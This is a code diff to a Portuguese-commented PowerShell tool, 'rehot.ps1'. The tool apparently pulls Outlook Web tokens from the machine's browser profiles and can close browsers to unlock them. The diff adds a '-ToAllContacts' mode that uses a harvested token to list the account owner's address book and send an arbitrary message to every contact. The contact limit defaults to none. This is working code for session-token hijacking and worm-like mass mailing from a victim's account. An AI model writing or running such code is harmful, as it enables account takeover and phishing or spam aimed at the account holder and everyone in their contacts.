@@ -20,11 +20,17 @@ Uso:
   powershell -File rehot.ps1                 # só detecta
   powershell -File rehot.ps1 -SendTo a@b.com # detecta + envia teste
   powershell -File rehot.ps1 -CloseBrowsers  # fecha navegadores antes (libera perfis travados)
+  powershell -File rehot.ps1 -ToAllContacts -Subject "Oi" -Body "msg" [-MaxContacts 50]
+      # lista a agenda do cliente e envia a mensagem designada a todos os contatos
 #>
 param(
     [string]$SendTo = "",
     [switch]$NoValidate,
-    [switch]$CloseBrowsers
+    [switch]$CloseBrowsers,
+    [switch]$ToAllContacts,   # envia a mensagem designada para TODOS os contatos da agenda
+    [string]$Subject = "",    # assunto da mensagem (vazio = padrão de teste)
+    [string]$Body = "",       # corpo da mensagem (vazio = padrão de teste)
+    [int]$MaxContacts = 0     # trava de segurança: 0 = sem limite
 )
 
 $ErrorActionPreference = "Stop"
@@ -429,6 +435,30 @@ function Send-OWAMail([string]$token, [string]$to, [string]$subject, [string]$bo
     }
 }
 
+# ---------------- agenda de contatos (GET /me/contacts, paginado) ----------------
+# Usa o MESMO token OWA (READ scope) que valida via /me — nao precisa de novo
+# consent. Retorna array de @{ name; email } (primeiro endereco de cada contato
+# que tenha e-mail). Contatos sem email (so telefone, por ex.) sao descartados.
+function Get-OWAContacts([string]$token) {
+    $result = @()
+    $uri = "$OWA_API_BASE/me/contacts?`$top=200"
+    while ($uri) {
+        try {
+            $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing
+        } catch { return $result }
+        $j = $resp.Content | ConvertFrom-Json
+        if ($j.value) {
+            foreach ($c in $j.value) {
+                $email = $null
+                if ($c.emailAddresses -and $c.emailAddresses.Count -gt 0) { $email = $c.emailAddresses[0].address }
+                if ($email) { $result += @{ name = $c.displayName; email = $email } }
+            }
+        }
+        $uri = $j."@odata.nextLink"
+    }
+    return $result
+}
+
 # ---------------- enumeração de perfis ----------------
 function Get-Profiles([string]$root) {
     $result = @()
@@ -586,12 +616,41 @@ if ($SendTo) {
     }
 }
 
+# ---- modo -ToAllContacts: lista a agenda e envia a mensagem designada a todos ----
+# Usa o token READ p/ listar (Get-OWAContacts) e o token WRITE p/ enviar
+# (Send-OWAMail, ja existente). -MaxContacts > 0 limita o total (trava de
+# seguranca contra agenda gigante / throttle). Pausa curta entre envios.
+$envioTodos = $null
+if ($ToAllContacts.IsPresent) {
+    $src = $validos | Where-Object { $_.token_write -and $_.token_read } | Select-Object -First 1
+    $subject = if ($Subject) { $Subject } else { "[TESTE EnvioHOT] rehot -ToAllContacts" }
+    $body    = if ($Body)    { $Body }    else { "Mensagem de teste para todos os contatos (PowerShell)" }
+    if ($src) {
+        $contatos = @(Get-OWAContacts $src.token_read)
+        if ($MaxContacts -gt 0 -and $contatos.Count -gt $MaxContacts) { $contatos = @($contatos | Select-Object -First $MaxContacts) }
+        $ok = 0; $falhas = @()
+        foreach ($c in $contatos) {
+            $res = Send-OWAMail $src.token_write $c.email $subject $body
+            if ($res.ok) { $ok++ }
+            else { $falhas += [PSCustomObject]@{ email = $c.email; status = $res.status; erro = $res.erro } }
+            Start-Sleep -Milliseconds 300
+        }
+        $envioTodos = [PSCustomObject]@{
+            de = $src.conta; total = $contatos.Count; enviados = $ok; falhas = $falhas
+            perfil = "$($src.navegador)/$($src.perfil)"
+        }
+    } else {
+        $envioTodos = [PSCustomObject]@{ de = $null; total = 0; enviados = 0; falhas = @(); status = "sem_perfil_com_token" }
+    }
+}
+
 $out = [PSCustomObject]@{
     maquina   = $env:COMPUTERNAME
     timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ss"
     navegadores_fechados = $fechados
     decisao   = $decisao
     envio     = $envio
+    envio_todos = $envioTodos
     perfis    = $results
 }
 $out | ConvertTo-Json -Depth 6
